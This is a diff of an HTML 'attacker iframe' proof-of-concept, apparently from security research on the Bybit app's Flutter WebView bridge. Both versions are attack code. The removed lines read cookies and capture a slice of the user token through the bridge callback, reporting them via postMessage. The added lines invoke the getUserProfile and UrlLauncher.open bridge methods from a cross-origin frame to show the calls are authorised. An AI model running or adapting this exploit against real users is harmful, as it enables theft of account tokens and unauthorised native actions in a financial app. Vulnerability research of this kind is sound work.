@@ -1,26 +1,21 @@
 <!doctype html><meta charset=utf-8><body style="background:#fee;font:11px monospace">
-<b>ATTACKER IFRAME</b> (origin: <span id=o></span>)
+<b>ATTACKER IFRAME</b> <span id=o></span>
 <script>
 document.getElementById('o').textContent = location.origin;
-function report(s){ try{ parent.postMessage("IFRAME|"+s, "*"); }catch(e){} }
-report("origin=" + location.origin);
-report("fliwv=" + (typeof window.flutter_inappwebview));
-report("callHandler=" + (window.flutter_inappwebview && typeof window.flutter_inappwebview.callHandler));
-report("bridgeObj=" + (typeof window._b_bridge_UserProfile_));
-report("cookie=" + (document.cookie || "(empty)"));
-// The decisive call: does the Dart side authorise on the TOP-LEVEL url (bybit.com)
-// rather than on this frame's origin?
-window._b_bridge_callback_ = function (o) {
-  try { var d = (typeof o === "string") ? JSON.parse(o) : o;
-        report("CALLBACK " + d.moduleName + "." + d.methodName +
-               " token=" + (d.params && d.params.userToken ? d.params.userToken.slice(0,40)+"..." : "none")); }
-  catch (e) { report("cb-err " + e); }
-};
-window.invokeCallback = window._b_bridge_callback_;
-try {
-  window.flutter_inappwebview.callHandler("_b_bridge_UserProfile_", JSON.stringify({
-    moduleName:"UserProfile", methodName:"getUserProfile", uniqueId:"frame1", params:{}
-  })).then(function(r){ report("promise=" + JSON.stringify(r).slice(0,200)); })
-     .catch(function(e){ report("promise-err=" + e); });
-} catch (e) { report("THROW " + e); }
+function report(s){ try{ parent.postMessage("IFRAME|"+s,"*"); }catch(e){} }
+function call(m,f,p){
+  return window.flutter_inappwebview.callHandler("_b_bridge_"+m+"_", JSON.stringify({
+    moduleName:m, methodName:f, uniqueId:"if"+Math.random().toString(36).slice(2), params:p||{}}));
+}
+report("origin="+location.origin+" callHandler="+(window.flutter_inappwebview&&typeof window.flutter_inappwebview.callHandler));
+// (1) read attempt: response is delivered to the MAIN frame, so the parent logs it
+try { call("UserProfile","getUserProfile",{}).then(r=>report("getUserProfile promise="+JSON.stringify(r))).catch(e=>report("gp-err="+e)); }
+catch(e){ report("gp-throw="+e); }
+// (2) ACTION with an observable side effect: no response needed. If the app drives the
+// device browser to this loopback URL, the iframe's bridge call was AUTHORISED.
+setTimeout(function(){
+  try { call("UrlLauncher","open",{url:"http://127.0.0.1:9/IFRAME_BRIDGE_AUTHORISED#origin="+encodeURIComponent(location.origin), externalApplication:true})
+        .then(r=>report("UrlLauncher promise="+JSON.stringify(r))).catch(e=>report("ul-err="+e)); }
+  catch(e){ report("ul-throw="+e); }
+}, 3000);
 </script></body>
